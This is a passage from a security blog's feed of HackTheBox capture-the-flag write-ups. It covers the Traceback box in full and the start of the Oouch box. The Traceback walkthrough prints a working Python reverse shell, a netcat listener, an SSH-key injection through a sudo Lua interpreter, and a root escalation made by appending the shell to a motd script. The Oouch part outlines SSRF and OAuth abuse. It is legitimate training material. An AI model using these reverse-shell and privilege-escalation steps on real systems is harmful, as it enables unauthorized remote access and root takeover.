or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> sqli </tag>
            
            <tag> magic </tag>
            
            <tag> upload </tag>
            
            <tag> double extension </tag>
            
            <tag> rce </tag>
            
            <tag> web shell </tag>
            
            <tag> trace </tag>
            
            <tag> suid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Traceback</title>
      <link href="/posts/traceback/"/>
      <url>/posts/traceback/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="traceback-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158679-9b336680-9889-11ea-8696-6a9b2dfe32ca.png"><p>Traceback just retired on Hackthebox, it’s an easy difficulty Linux box. This one is quite straightforward box if you are familiar with CTF. It exploit a similar misconfiguration we saw previously in the <a href="https://hg8.sh/posts/writeup/">Writeup Box</a>. I wouldn’t recommend it for total beginner since the frequent reset resulting in lot of users working on it, and exploit conflicts can be frustrating to progress on. </p><p><strong>Tl;Dr:</strong> The user flag consist in retrieving and exploiting a web-shell planted by a hacker on the web-server of the machine. From there you pivot from <code>webadmin</code> to <code>sysadmin</code> using a Lua interpreter running as the said user.<br>The root flag could be grabbed by exploiting a misconfiguration of <code>/etc/update-motd.d/</code> folder permissions allowing the user to edit scripts run as <code>root</code> by <code>run-parts</code> at login time.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.181 traceback.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC traceback.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 21:11 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> traceback.htb (10.10.10.181)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Help us</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>We have the “classic”: A web app running on port 80 and the SSH port 22 open. </p><p>Opening <code>http://traceback.htb/</code> display the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/77252647-75a52a80-6c55-11ea-8d0d-ec4daaa5f7bf.png" alt="traceback owned"></p><p>From what we can see here the website seems to have been hacked. The malicious actor indicate he/she left a backdoor open. </p><p>That’s a nice hint… If we can find this backdoor we can use it without needing to find the exploit by ourselves.<br>With that in mind let’s try to find more informations.</p><p>When we check the code source of the page we notice an interesting comment:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>This site has been owned<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h3</span>&gt;</span> - Xh4H - <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--Some of the best web shells that you might need ;)--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Googling <code>Some of the best web shells that you might need</code> return a <a href="https://github.com/TheBinitGhimire/Web-Shells">Github repository</a> with the exact same text as description full of webshell. Our hacker used one of those for sure.</p><p>From here we could write a little script that get the shells list on the git repository and to test each shell in the url to find which one if is present on the server but…. since there is only 15 let’s just copy paste by hand ;)</p><p>We got on the right idea, opening <code>http://traceback.htb/smevk.php</code> display this login page:</p><p><img src="https://user-images.githubusercontent.com/9076747/77252895-3081f800-6c57-11ea-8f0f-67a74318d795.png" alt="smevk shell login page"></p><h3 id="Smevk-Webshell"><a href="#Smevk-Webshell" class="headerlink" title="Smevk Webshell"></a>Smevk Webshell</h3><p>Checking the <a href="https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php">shell source code</a> on the previous Github repository informs us that the defaults credentials are <code>admin:admin</code>. Let’s try:</p><p><img src="https://user-images.githubusercontent.com/9076747/77252915-5b6c4c00-6c57-11ea-8237-4d8ff8580f26.png" alt="smevk shell"></p><p>Let’s try not to focus too much on the design here. </p><p>The shell allow include a command injection tool, but it’s far from being practical. The easiest way to progress from here is to open a reverse shell using the web shell. We can use for example a Python one:</p><ol><li>Creating and dropping the Python reverse shell:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;10.10.10.10&quot;</span>,8585));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>Once we have created our reverse shell we can use the Web Shell to upload it to the server:</p><p><img src="https://user-images.githubusercontent.com/9076747/77253164-e732a800-6c58-11ea-9659-e48e79783f6b.png" alt="sending python reverse shell"></p><ol start="2"><li>We then start our listener:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><ol start="3"><li>And finally launch our reverse shell using the Web Shell:</li></ol><p><img src="https://user-images.githubusercontent.com/9076747/77253323-a12a1400-6c59-11ea-8ac4-f929aca19150.png" alt="python reverse shell"></p><p>And we get our connection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.181:58642</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span></span><br></pre></td></tr></table></figure><p>We now have a shell as <code>webadmin</code> user. Let’s now do a bit of recon on this user files available on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">webadmin@traceback:/$ ls -l /home/</span><br><span class="line">total 8</span><br><span class="line">drwxr-x--- 5 sysadmin sysadmin 4096 Mar 22 07:26 sysadmin</span><br><span class="line">drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 webadmin</span><br><span class="line"></span><br><span class="line">webadmin@traceback:/$ ls /home/webadmin</span><br><span class="line">note.txt</span><br><span class="line"></span><br><span class="line">webadmin@traceback:/$ cat note.txt</span><br><span class="line">- sysadmin -</span><br><span class="line">I have left a tool to practice Lua.</span><br><span class="line">I<span class="string">&#x27;m sure you know where to find it.</span></span><br><span class="line"><span class="string">Contact me if you have any question.</span></span><br></pre></td></tr></table></figure><p>Alright we have a little more information here. We will need to pivot to <code>sysadmin</code> user and this one gave left a note leading  to a tool about practice Lua. </p><h3 id="Pivot-webadmin-gt-sysadmin"><a href="#Pivot-webadmin-gt-sysadmin" class="headerlink" title="Pivot webadmin -&gt; sysadmin"></a>Pivot webadmin -&gt; sysadmin</h3><p>Since we don’t know where is the tool to practice Lua that <code>sysadmin</code> talk about let’s continue our classic recon process for the moment. </p><p>When checking for informations on <code>sudo</code> we stumble upon an interesting <code>NOPASSWD</code> entry: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webadmin@traceback:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> webadmin on traceback:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User webadmin may run the following commands on traceback:</span><br><span class="line">    (sysadmin) NOPASSWD: /home/sysadmin/luvit</span><br></pre></td></tr></table></figure><p>We can run the following command <code>/home/sysadmin/luvit</code> as <code>sysadmin</code> without having to use password. </p><p>Let’s open this <code>luveit</code> to see what is it about:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webadmin@traceback:/$ sudo -u sysadmin /home/sysadmin/luvit</span><br><span class="line">Welcome to the Luvit repl!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>According to Luvit.io website:</p><blockquote><p>Luvit implements the same APIs as Node.js, but in Lua!<br>This helps teams migrate without having to learn a new way of programming.  </p></blockquote><p>So if I understand correctly it’s a Lua interpreter including the same APIs as Node.js.</p><p>Since it’s able to run Lua and Node.js as <code>sysadmin</code> it very possible we have write abilities on <code>sysadmin</code> home folder. And we know that arbitrary file write definitely lead to privilege escalation.</p><p>A common approach to privilege escalation using file write is to add our public SSH key to the <code>~/.ssh/authorized_keys</code> file.</p><p>In Lua this would give something like this:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">&quot;/home/sysadmin/.ssh/authorized_keys&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">file:<span class="built_in">write</span>(<span class="string">&quot;ssh-rsa AAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXLmWQ== hg8@hg8.sh&quot;</span>)</span><br><span class="line">file:<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><p><em>Note: Don’t forget to open the <code>authorized_keys</code> file in append mode (<code>a</code>) to not overwrite the actual config or the keys of other players that potentially used the same trick.</em></p><p>Let’s run it to check if it works as intended:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webadmin@traceback:/$ sudo -u sysadmin /home/sysadmin/luvit /tmp/hg8.lua</span><br><span class="line">webadmin@traceback:/$ </span><br></pre></td></tr></table></figure><p>No error, let’s now try to login to <code>sysadmin</code> account using the SSH key we just authorized:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa sysadmin@traceback.htb</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line">-------- OWNED BY XH4H  ---------</span><br><span class="line">- I guess stuff could have been configured better ^^ -</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"></span><br><span class="line">Welcome to Xh4H land</span><br><span class="line"></span><br><span class="line">Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2</span><br><span class="line">sysadmin@traceback:~$ id</span><br><span class="line">uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)</span><br><span class="line">sysadmin@traceback:~$ ls</span><br><span class="line">luvit  user.txt</span><br><span class="line">sysadmin@traceback:~$ cat user.txt</span><br><span class="line">3xxxxxxxxxxxxxxxxxxxxxxxb</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The first thing we notice when login to <code>sysadmin</code> account is that our hacker didn’t only drop a webshell on the server but also modified a few files. For example this custom message on login time:</p><blockquote><p>#################################<br>——– OWNED BY XH4H  ———<br>- I guess stuff could have been configured better ^^ -<br>#################################  </p><p>Welcome to Xh4H land</p></blockquote><p>Let’s search on the system for <code>xh4h</code> to see if our hacker dropped some interesting other files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sysadmin@traceback:~$ grep -ri <span class="string">&quot;xh4h&quot;</span> / 2&gt;/dev/null</span><br><span class="line">/etc/update-motd.d/00-header:<span class="built_in">echo</span> <span class="string">&quot;\nWelcome to Xh4H land \n&quot;</span></span><br><span class="line">/var/www/html/index.html:               &lt;h3&gt; - Xh4H - &lt;/h3&gt;</span><br><span class="line">/var/backups/.update-motd.d/00-header:<span class="built_in">echo</span> <span class="string">&quot;\nWelcome to Xh4H land \n&quot;</span></span><br></pre></td></tr></table></figure><p>Seems like nothing else to see. </p><p>Let’s focus on this <code>00-header</code> in <code>update-motd.d</code> folder. For those who are unfamiliar with <code>motd</code> here is a reminder of what it does:</p><blockquote><p>The  contents  of /etc/motd are displayed by pam_motd(8) after a successful login but just before it executes the login shell.  </p><p>The abbreviation “motd”  stands  for  “message  of  the  day”,  and  this  file  has  been  traditionally  used  for  exactly  that (it requires much less disk space than mail to all  users).</p></blockquote><p>Let’s see what we have on this server <code>update-motd.d</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sysadmin@traceback:/etc/update-motd.d$ ls -l</span><br><span class="line">total 24</span><br><span class="line">-rwxrwxr-x 1 root sysadmin  981 Mar 22 09:37 00-header</span><br><span class="line">-rwxrwxr-x 1 root sysadmin  982 Mar 22 09:37 10-help-text</span><br><span class="line">-rwxrwxr-x 1 root sysadmin 4264 Mar 22 09:37 50-motd-news</span><br><span class="line">-rwxrwxr-x 1 root sysadmin  604 Mar 22 09:37 80-esm</span><br><span class="line">-rwxrwxr-x 1 root sysadmin  299 Mar 22 09:37 91-release-upgrade</span><br></pre></td></tr></table></figure><p>First thing that catch the eye here is that all those file belong to <code>sysadmin</code> group, meaning we, as <code>sysadmin</code> user can read, write and execute them even though we are not the owner. </p><p>Alright, now how are those files executed to end up being displayed at login time ?</p><p>If you are familiar with Debian you may know about the <code>run-parts</code> utility:</p><blockquote><p>run-parts - run scripts or programs in a directory</p></blockquote><p><code>run-parts</code> will run all the scripts in a given directory. It’s very useful in a lot of scenarios. For example it’s used in Debian to dynamically generate a Message Of Day (MOTD) by combining all the output of scripts present in <code>/etc/update-motd.d/</code> folder, like so:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ run-parts /etc/update-motd.d/*</span><br></pre></td></tr></table></figure><p>And this is done at login time as <code>root</code>.</p><p> See what’s the issue is here ? We are able to edit file that are going to be run as root. </p><p>Let’s now use this knowledge to escalate our privileges to root.</p><h3 id="Exploiting-run-parts-and-motd"><a href="#Exploiting-run-parts-and-motd" class="headerlink" title="Exploiting run-parts and motd"></a>Exploiting run-parts and motd</h3><p>To exploit this misconfiguration we could have used the same trick as before to add our SSH key to <code>root</code> user <code>.authorized_keys</code> file. But let’s change a bit and open a reverse shell this time.</p><p>First, we open our <code>netcat</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Then let’s edit, for example, <code>00-header</code> to add a command to open our reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysadmin@traceback:/etc/update-motd.d$ <span class="built_in">echo</span> <span class="string">&quot;python /tmp/.tmp/hg8.py&quot;</span> &gt;&gt; 00-header</span><br></pre></td></tr></table></figure><p>Now next time we login, our reverse shell will be executed as root. Let’s give it a try by logout of SSH and login in again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa sysadmin@traceback.htb</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line">-------- OWNED BY XH4H  ---------</span><br><span class="line">- I guess stuff could have been configured better ^^ -</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"></span><br><span class="line">Welcome to Xh4H land</span><br></pre></td></tr></table></figure><p>At this moment, our connection as root open:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.181:60494</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx9</span><br></pre></td></tr></table></figure><hr><p>As always do not hesitate to contact me for any questions or feedbacks :)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> webshell </tag>
            
            <tag> sudo </tag>
            
            <tag> traceback </tag>
            
            <tag> lua </tag>
            
            <tag> motd </tag>
            
            <tag> run-parts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Oouch</title>
      <link href="/posts/oouch/"/>
      <url>/posts/oouch/</url>
      
        <content type="html"><![CDATA[<img width="574" alt="oouch-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158507-a639c700-9888-11ea-83d0-9e50890dd8a9.png"><p>Oouch just retired on Hackthebox, it’s a hard difficulty Linux box. As of today it’s amongst the box that have the highest user rated difficulty with a score of 8.2/10.<br>While being very well desinged, this box unsurprisingly gave me a very hard time but it’s also the box that made me learn the most since I started HackTheBox. While it can be very tedious to progress at first, it quickly makes a lot of sense and become very rewarding once you know what you are looking for and trying to exploit. As much as ever this box reminds the importance of looking at the big picture. Puts things into perspective in order to understand the logic behind an application makes its exploitation more straightforward.<br>The truth is I got stuck a little on it so special thanks to my buddy <em>El_B@rt0</em> for the help along the torturous road.<br>Alright enough with the talk and place to the writeup!</p><p><strong>Tl;Dr:</strong> In order to retrieve the user flag you had to chain multiple OAuth 2.0 protocol flaws with a SSRF vulnerability in order to “steal” admin account access. In a first part you use the SSRF vulnerability to access admin documents containing credentials to access the OAuth authorization server. From there we could create our own application and craft an authorization link redirecting to our server. Using the SSRF this link can be used to steal the admin session cookie. With the admin cookie, it’s possible to generate a API access token. With this token we can request the API which contains an endpoint used to retrieve connected user SSH key. The SSH key is then used to connect as <code>qtc</code> and grab the flag.<br>To retrieve the root flag you had first to pivot from <code>qtc</code> user in a docker container to <code>www-data</code> using a Remote Code Execution exploit on the web-server running. As <code>www-data</code> is was possible to exploit a custom <code>DBus</code> server used by the app in order to let the docker container communicate with the host. You would craft and send a malicious message to the interface used by the app and achieve Remote Code Execution as <code>root</code> through the privileged <code>Dbus</code> server. </p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.177 oouch.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sC -T4 -p- oouch.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> oouch.htb (10.10.10.177)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">5000/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">| http-title: Welcome to Oouch</span><br><span class="line">|_Requested resource was http://oouch.htb:5000/login?next=%2F</span><br><span class="line">8000/tcp open  rtsp</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 1017.45 seconds</span></span><br></pre></td></tr></table></figure><p>We have two high port open on <code>5000</code> and <code>8000</code> open. <code>5000</code> seems to be the main app web server. </p><p>Port 22 SSH is open as usual aswell with port 21 FTP which allows <code>anonymous</code> login. We will start with that.</p><h3 id="FTP-anonymous-user"><a href="#FTP-anonymous-user" class="headerlink" title="FTP anonymous user"></a>FTP anonymous user</h3><p>Let’s start by checking if we can retrieve any files from the FTP server. We indeed find a <code>project.txt</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp oouch.htb</span><br><span class="line">Connected to oouch.htb.</span><br><span class="line">220 qtc<span class="string">&#x27;s development server</span></span><br><span class="line"><span class="string">Name (oouch.htb:hg8): anonymous</span></span><br><span class="line"><span class="string">230 Login successful.</span></span><br><span class="line"><span class="string">Remote system type is UNIX.</span></span><br><span class="line"><span class="string">ftp&gt; ls</span></span><br><span class="line"><span class="string">-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt</span></span><br><span class="line"><span class="string">ftp&gt; get project.txt</span></span><br><span class="line"><span class="string">226 Transfer complete.</span></span><br><span class="line"><span class="string">ftp&gt; quit</span></span><br><span class="line"><span class="string">221 Goodbye.</span></span><br></pre></td></tr></table></figure><p>Let’s see what we got inside:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat project.txt</span><br><span class="line">Flask -&gt; Consumer</span><br><span class="line">Django -&gt; Authorization Server</span><br></pre></td></tr></table></figure><p>Alright so that’s not a lot of informations… Given the name of the box we are probably going to have an OAuth server. The consumer app is written using Flask Python Framework and Django is used for the Authorization Server. Let’s keep that in mind. Maybe later we can find exploits for those.</p><h3 id="Oouch-main-application-port-5000"><a href="#Oouch-main-application-port-5000" class="headerlink" title="Oouch main application (port 5000)"></a>Oouch main application (port 5000)</h3><p>Opening <code>http://oouch.htb:5000</code> display the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/81942934-0ddae280-95fb-11ea-940a-4c4e329b61f6.png" alt="oouch port 5000"></p><p>Since we can register let’s create a new account. Once logged-in we arrive on the following page:</p><p><img src="https://user-images.githubusercontent.com/9076747/81943091-3c58bd80-95fb-11ea-9e2f-867eb8a4c1c5.png" alt="oouch 5000 login"></p><p>We can access a few new pages from there. The most useful one seems to be:</p><ul><li>Profile: display informations about the connected account. Informs us it’s possible to links accounts.</li><li>Documents: display administrative documents stored for the connected account.</li><li>Contact: Allows to forward messages to the system administrator. </li></ul><p>The About page confirm our theory about Django:</p><blockquote><p>This application is the pilot project for our Oouch authorization server.</p></blockquote><p>Let’s continue our recon.</p><h3 id="Contact-Page-SSRF"><a href="#Contact-Page-SSRF" class="headerlink" title="Contact Page SSRF"></a>Contact Page SSRF</h3><p>The choice of words in contact page catch my attention:</p><blockquote><p>Messages that were submitted in the message box below are forwarded to the system administrator. </p></blockquote><p>Out of curiosity I sent various payload to the message box and quick noticed it’s vulnerable to SSRF:</p><p><img src="https://user-images.githubusercontent.com/9076747/81944066-7aa2ac80-95fc-11ea-835a-fdf04adf06f0.png" alt="oouch contact ssrf"></p><p>On our web server we see a new request coming from <code>10.10.10.177</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.177 - - [14/May/2020 16:03:19] <span class="string">&quot;GET /ssrf HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure><p>But so far we have no way to exploit it properly, let’s just keep it in mind for later.</p><h3 id="Oauth-Flow"><a href="#Oauth-Flow" class="headerlink" title="Oauth Flow"></a>Oauth Flow</h3><p>Let’s continue our recon by running <code>gobuster</code> to see if other files/endpoints are accessible:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://oouch.htb:5000&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer 